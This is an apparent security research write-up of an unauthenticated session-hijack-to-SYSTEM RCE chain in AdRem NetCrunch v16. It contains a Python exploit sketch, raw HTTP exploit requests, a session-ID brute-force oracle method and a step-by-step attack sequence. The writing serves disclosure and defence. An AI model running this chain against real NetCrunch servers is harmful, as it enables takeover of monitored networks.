# AdRem NetCrunch Cross-Session Hijack RCE - Technical Analysis

## Overview

AdRem NetCrunch v16.0.0.8397 RC's Node.js web layer (WebAppServer.exe, port 9443) lacks a caller-ownership check in its RPC session-reuse mechanism: `getSession()` parses the `sid@gid` in the `x-sid` header without verifying that the session was created by the current requester, and `rpcRequest()` -> `getApp(url, gid, sid, autoCreate=false)` looks up an existing authenticated ApiSession by gid+sid and reuses its token. An unauthenticated attacker A who obtains a victim B's `sid@gid` can impersonate B and invoke any authenticated RPC method. Combined with the startup-script command-execution sink (`INcStartupScript.SetScriptOptions` to persist a malicious command + `INetCrunchServer.RestartNCServer` to trigger execution on service restart), this forms a complete unauthenticated -> SYSTEM RCE chain. NCServerSvc runs as LocalSystem.

## Stage 0: Authentication Boundary

### Product architecture

NetCrunch is a Windows-native NMS. It uses a Node.js SEA (WebAppServer.exe) as a thin web-front proxy, and a Delphi backend NCServer.exe (35.86 MB) handles all business logic and authentication.

```
Browser / client
    | HTTPS 9443
    v
WebAppServer.exe (Node.js SEA)  <- thin proxy, 0 auth checks, 0 command-exec sinks
    | RPC wire protocol
    v
NCServer.exe (Delphi, 35.86 MB)  <- all auth here, per-method enforced auth (EServerAccessDenied)
    |
    v
PostgreSQL (C:\ProgramData\AdRem\NetCrunch\data\pgsql\)
```

NCServerSvc runs as **LocalSystem**.

### Auth-gate location

| Layer | Location | Auth check |
|----|------|---------|
| Node HTTP layer | `http-handler.js` `rpc()`/`data()`/`events()` | none; only parses x-sid |
| Node session layer | `native-requester.mjs` `rpcRequest` -> `getApp` | **no ownership check**; looks up session by gid+sid (core of this vuln) |
| Node API layer | `api-manager.js` `processRequest` | none; forwards directly |
| Backend Delphi layer | NCServer.exe | per-method enforced auth (EServerAccessDenied) |

CVE-2019-14480 (unauthenticated auth bypass, CVSS 9.8) is fixed in v16 — directly calling an ncSrv method unauthenticated returns EServerAccessDenied. But the Node layer's session-reuse mechanism has no caller-ownership check, which is a **newly discovered attack path** that bypasses the backend auth gate.

## Stage 1: Sink Identification

### Startup-script command-execution sink

Via `api.json` interface enumeration (`GET /nc/console/api.json` + `x-app:web` returns the full 77 ncSrv interfaces / 573 methods with zero credentials), the `INcStartupScript` interface was found:

- `INcStartupScript.SetScriptOptions(options)` — persists the startup-script config to the registry
- `INcStartupScript.GetScriptOptions()` — reads the current startup-script config
- `INcStartupScript.ExecuteScript()` — execute immediately (but observed to return null and not execute; only runs on restart)

Registry keys (`HKLM\...\NetCrunch\Server\16.0.0\StartupScript`):
- `Cmd` — executable path
- `Parameters` — command-line arguments
- `WaitFor` — whether to wait for completion
- `Timeout` — timeout in seconds

**Key finding**: the `SetScriptOptions` field names are **lowercase** `cmd`/`params`/`wait`/`timeout` (not the Delphi class field names Cmd/Parameters/WaitFor/TimeOut). Correct packet:

```json
{"cmd":"C:\\Windows\\System32\\cmd.exe","params":"/c echo RCE > C:\\marker.txt","wait":true,"timeout":30}
```

### Triggering execution

`INetCrunchServer.RestartNCServer([])` (a no-argument RPC method) triggers an NCServer service restart. The restart's **Initializing phase** calls `TStartupScriptExecutor.ExecuteScript`, which runs the cmd+params persisted in the registry.

**Key**: `RestartNCServer` is a pure RPC method and triggers a service restart without needing shell / service-management privileges — the attacker triggers the restart and the malicious startup-script execution through an RPC call.

## Stage 2: Source Identification

### sid@gid generation (predictable)

`session-manager.js` `newSessionId()` (L90-97):

```javascript
newSessionId() {
    let sid;
    do {
        sid = Math.floor(Math.random() * 30_000_000) + 1;  // xorshift128+ PRNG, NOT a CSPRNG
    } while (this._sessionIds.has(sid));
    this._sessionIds.add(sid);
    return sid;
}
```

- Algorithm: V8 `Math.random()` (xorshift128+ PRNG, **not a CSPRNG**)
- Space: 1 ~ 30,000,000 (~24.8 bit)

`session-manager.js` `newGroupId()` (L100-107):

```javascript
newGroupId() {
    let gid = (Date.now() - this._timeOffset);  // _timeOffset = new Date('1-1-2026').getTime()
    if (this._lastGid >= gid) { gid = this._lastGid + 1; }
    this._lastGid = gid;
    return gid;
}
```

- Algorithm: `Date.now() - epoch(2026-01-01)` (millisecond-timestamp offset)
- Predictability: an attacker who knows the server's current time can predict gid to ~1s precision

### x-sid parsing (no ownership check)

`http-handler.js` `getSession()`:

```javascript
getSession(req) {
    const sidHeader = req.headers['x-sid'] || req.query.sid || '';
    let [sid, gid] = sidHeader?.split('@') || [];
    sid = parseInt(sid, 10) || 0;
    gid = parseInt(gid, 10) || 0;
    return {gid, id: sid};
}
```

- Parses the `x-sid` header, format `sid@gid`
- **Flaw**: no caller-ownership check — does not verify that this sid@gid was created by the current request's session

## Stage 3: Data Flow

### F1 cross-session hijack data flow

```
Attacker A (unauthenticated, independent newAppSession)
    | POST /nc/console/rpc?api=ncsrv
    | x-sid: <B_sid>@<B_gid>   <- A passes B's sid@gid
    | body: [{"action":"INetCrunchServer","method":"GetServerSystemVersion","tid":1,"data":[]}]
    v
http-handler.js getSession(req)
    | parse x-sid -> {gid: B_gid, id: B_sid}
    | no ownership check
    v
native-requester.mjs rpcRequest(url, api, req, B_gid, B_sid)
    | const app = this._sessionManager.getApp(url, B_gid, B_sid);  // autoCreate=false
    | getApp looks up _appSessions by B_gid -> finds B's AppSession
    | looks up apiSessions by B_sid -> finds B's authenticated ApiSession (with B's token)
    v
api-manager.js processRequest(api, intf, method, data)
    | uses B's apiManager (carrying B's token) to call the backend
    v
NCServer.exe (Delphi)
    | backend authenticates with B's token -> passes
    | executes GetServerSystemVersion -> returns {major:10,minor:0,build:26100}
    v
A receives B's authenticated data (A never logged in, has no token)
```

**Key**: the F1 path goes through `rpcRequest` -> `getApp(autoCreate=false)`, **bypassing** the `getApiDefinitions`/`init()` hang bug (F6). That bug only affects the `api.json` `newSession` minting path (minting a new sid inside B's group triggers `_onAuthenticated` to propagate B's real token and hangs). F1 directly reuses B's existing initialized ApiSession and does not trigger init().

### RCE data flow

```
A (via F1 hijack of B's authenticated state)
    | 1. SetScriptOptions([{cmd,params,wait,timeout}])
    |    -> persist to registry StartupScript.Cmd/Parameters/WaitFor/Timeout
    v
    | 2. RestartNCServer([])
    |    -> NCServer service restart
    v
NCServer Initializing phase
    | TStartupScriptExecutor.ExecuteScript
    | reads registry StartupScript.Cmd + Parameters
    | executes cmd.exe /c <params>
    v
SYSTEM-privilege arbitrary command execution (NCServerSvc = LocalSystem)
```

## Stage 4: Exploit Construction

### sid@gid acquisition (purely unauthenticated)

**Path A: 449/200 oracle brute-force probing**

The rpc endpoint returns HTTP 200 for a valid sid@gid and HTTP 449 (empty body) for invalid / missing / malformed:

```
valid sid@gid (B's)         -> HTTP 200 (result JSON)
invalid sid, valid gid      -> HTTP 449
valid sid, invalid gid      -> HTTP 449
both invalid                -> HTTP 449
no x-sid header             -> HTTP 449
```

Attacker:
1. Predict gid: `gid ~= Date.now() - epoch(2026-01-01)`, ~1s precision = ~1000 candidate gids
2. For each candidate gid, brute-force probe sid (30M space), distinguishing via 449/200
3. Session valid window 180s (sessionCleanupSec)

**Observed**: 4000 candidates / 18.3s @ 219 req/s (50 threads), successfully located B's sid. Extrapolation: full 30M space @ 4378 req/s (1000 threads) ~= 114min; the 180s session window @ 4378 req/s covers ~788k sid (2.63% of the space). Feasible in high-bandwidth multi-threaded scenarios; V8 xorshift128+ state recovery (~4 consecutive outputs to recover z3) is theoretically feasible but requires denoising.

**Path B: leakage**

sid@gid appearing in log files, error pages, Referer, or SSRF responses can be obtained directly, no brute force needed.

### F1 hijack + RCE construction

```python
# A uses B's sid@gid (no login, no api.json needed)
a_sg = f"{b_sid}@{b_gid}"

# 1. Verify the hijack succeeded
rpc(a_sg, "ncsrv", "INetCrunchServer", "GetServerSystemVersion")
# -> 200 {"result":{"major":10,"minor":0,"build":26100}}

# 2. Write the malicious startup script
opts = {"cmd": r"C:\Windows\System32\cmd.exe",
        "params": "/c echo NC_F1_HIJACK_RCE > C:\\Windows\\Temp\\nc_rce_f1.txt",
        "wait": True, "timeout": 30}
rpc(a_sg, "ncsrv", "INcStartupScript", "SetScriptOptions", [opts])

# 3. Trigger the restart execution
rpc(a_sg, "ncsrv", "INetCrunchServer", "RestartNCServer", [])

# 4. Wait 35s, check the marker
# -> C:\Windows\Temp\nc_rce_f1.txt content "NC_F1_HIJACK_RCE"
```

## Stage 5: Dynamic Verification

### Real HTTP request + response

**B login** (victim):

```http
GET /nc/console/api.json
x-app: web
-> 200 {"sid":"13646139@17107479281",...}

POST /nc/console/rpc?api=client.session
x-sid: 13646139@17107479281
[{"action":"Security","method":"LoginEx","tid":1,"data":["web","admin","<reset_pw>"]}]
-> 200 [{"result":{"Token":"..."}}]
```

**A F1 hijack + RCE** (A never logged in, uses B's sid@gid):

```http
POST /nc/console/rpc?api=ncsrv
x-sid: 13646139@17107479281
[{"action":"INetCrunchServer","method":"GetServerSystemVersion","tid":1,"data":[]}]
-> 200 [{"tid":1,"result":{"major":10,"minor":0,"build":26100}}]

POST /nc/console/rpc?api=ncsrv
x-sid: 13646139@17107479281
[{"action":"INcStartupScript","method":"SetScriptOptions","tid":1,"data":[{"cmd":"C:\\Windows\\System32\\cmd.exe","params":"/c echo NC_F1_HIJACK_RCE > C:\\Windows\\Temp\\nc_rce_f1.txt","wait":true,"timeout":30}]}]
-> 200 [{"tid":1,"result":null}]

POST /nc/console/rpc?api=ncsrv
x-sid: 13646139@17107479281
[{"action":"INetCrunchServer","method":"RestartNCServer","tid":1,"data":[]}]
-> 200 [{"tid":1,"result":null}]
```

### Result evidence

After waiting 35s, check the marker:

```
marker: MARKER_EXISTS
NC_F1_HIJACK_RCE
```

The marker file contains `NC_F1_HIJACK_RCE`; StartupScript.log shows exit code 0.

**Privilege**: NCServerSvc runs as LocalSystem -> the command executes with **SYSTEM** privileges.

### 449/200 oracle + gid predictability verification

```
B gid=17107565503, predicted=17107565522, diff=19ms (0s precision)
Oracle: valid->200, invalid sid->449, invalid gid->449, both invalid->449, no x-sid->449
Brute-force: 4000 cands / 18.3s @ 219 req/s, found B's sid=1834688
>>> pure-unauth sid@gid acquisition CONFIRMED
```

## Stage 6: Reachability

### Unauthenticated reachability

- **sid@gid acquisition**: purely unauthenticated (oracle brute force / leakage), no credentials needed
- **F1 hijack**: A calls RPC with B's sid@gid; the Node layer has no ownership check and directly reuses B's authenticated state
- **SetScriptOptions**: reachable via the hijacked authenticated state (B can be admin or a normal user, as long as the group has an authenticated ApiSession)
- **RestartNCServer**: reachable via the hijacked authenticated state; a pure RPC triggers the service restart

### Prerequisites

- An existing authenticated victim session (admin or normal user)
- Attacker access to port 9443 (default binds 0.0.0.0:9443, or via 9080 -> 301 -> 9443)
- Attacker ability to obtain the victim's sid@gid (oracle brute force / log leakage / Referer / SSRF)

### Default config

- Default install has the session-reuse no-ownership-check flaw
- Default 9443 port listening
- `INcStartupScript.SetScriptOptions` + `RestartNCServer` available by default (post-auth)
- NCServerSvc runs as LocalSystem by default

## Complete Attack Sequence

1. **Acquire sid@gid**: predict gid (timestamp offset, ~1s precision) and brute-force sid via the 449/200 oracle, or obtain via leakage
2. **F1 hijack**: POST an RPC with the victim's `x-sid: <B_sid>@<B_gid>` -> the Node layer reuses B's authenticated ApiSession (A never logged in)
3. **Verify hijack**: call `INetCrunchServer.GetServerSystemVersion` -> 200 with the version confirms the authenticated state is reused
4. **Persist malicious startup script**: call `INcStartupScript.SetScriptOptions` with `{cmd, params, wait, timeout}` -> writes to the registry
5. **Trigger execution**: call `INetCrunchServer.RestartNCServer` -> the service restarts and the Initializing phase runs the persisted cmd+params
6. **Command executes**: the command runs with SYSTEM privileges (NCServerSvc = LocalSystem)